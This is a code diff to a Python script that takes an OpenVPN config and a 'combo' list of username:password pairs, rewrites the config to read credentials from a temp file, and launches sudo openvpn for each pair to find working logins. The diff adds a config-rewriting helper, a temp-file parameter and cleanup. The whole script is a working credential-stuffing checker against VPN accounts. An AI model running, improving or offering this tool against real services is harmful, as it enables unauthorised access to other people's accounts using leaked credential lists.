@@ -11,7 +11,41 @@ CONFIG = sys.argv[1]
 COMBO = sys.argv[2]
 
 
-def create_temp_file(user, passwd):
+def chenge_config_auth_type(CONFIG):
+    """creates temp config file for
+     new auth method (file based auth).
+
+    Args:
+        CONFIG (str): config file name
+
+    Returns:
+        str: temp config name
+    """
+    new_config_data = ""
+    try:
+        with open(CONFIG, "r") as main_config:
+            for line in main_config.readlines():
+                if line.startswith("auth-user-pass"):
+                    new_config_data += f"auth-user-pass ./{TEMP_FILE_NAME}\n"
+                else:
+                    new_config_data += line
+    except FileNotFoundError:
+        print("Config file not found.")
+
+    new_config_name = f"temp_{CONFIG}"
+    remove_file(new_config_name)
+    with open(new_config_name, "a+") as new_config_file:
+        new_config_file.write(new_config_data)
+    return new_config_name
+
+
+def remove_file(new_config_name):
+    if os.path.isfile(new_config_name):
+        os.remove(new_config_name)
+    return None
+
+
+def create_temp_file(user, passwd, TEMP_FILE_NAME):
     """Creates a temp file that
        Openvpn config will read this file
        for username and password.
@@ -19,21 +53,22 @@ def create_temp_file(user, passwd):
     Args:
             user (str): username
             passwd (str): password
+            TEMP_FILE_NAME (str): temp file name
 
     Returns:
             None: nothing
     """
-    temp_file_name = "temp.txt"
-    if os.path.isfile(temp_file_name):
-        os.remove(temp_file_name)
-    with open(temp_file_name, "a+") as temp_file:
+    if os.path.isfile(TEMP_FILE_NAME):
+        os.remove(TEMP_FILE_NAME)
+    with open(TEMP_FILE_NAME, "a+") as temp_file:
         temp_line = f"{user}\n{passwd}"
         temp_file.write(temp_line)
     return None
 
 
 def get_conn_status(user, passwd, output):
-    """_summary_
+    """Gets command output then
+    checks either failed or no
 
     Args:
             user (str): username
@@ -62,7 +97,7 @@ def get_conn_status(user, passwd, output):
         return None
 
 
-def run(CONFIG, COMBO):
+def run(CONFIG, COMBO, TEMP_FILE_NAME):
     """This module gets CONFIG, COMBO files
        and extracts user and passwords
        then check them with openvpn command
@@ -70,12 +105,13 @@ def run(CONFIG, COMBO):
     Args:
                     CONFIG (File): OpenVpn config file
                     COMBO (File): User password files
+                    TEMP_FILE_NAME (str): temp file name
     """
     try:
         with open(COMBO, "r") as passwords_files:
             for counter, line in enumerate(passwords_files.readlines()):
                 user, passwd = line.strip().split(":")
-                create_temp_file(user, passwd)
+                create_temp_file(user, passwd, TEMP_FILE_NAME)
 
                 x = subprocess.Popen(
                     ["sudo", "openvpn", "--auth-nocache", "--ping-exit", "3", "--config", CONFIG],
@@ -97,4 +133,8 @@ def run(CONFIG, COMBO):
 
 
 if __name__ == "__main__":
-    run(CONFIG, COMBO)
+    TEMP_FILE_NAME = "temp.txt"
+    CONFIG = chenge_config_auth_type(CONFIG)
+    run(CONFIG, COMBO, TEMP_FILE_NAME)
+    remove_file(TEMP_FILE_NAME)
+    remove_file(CONFIG)
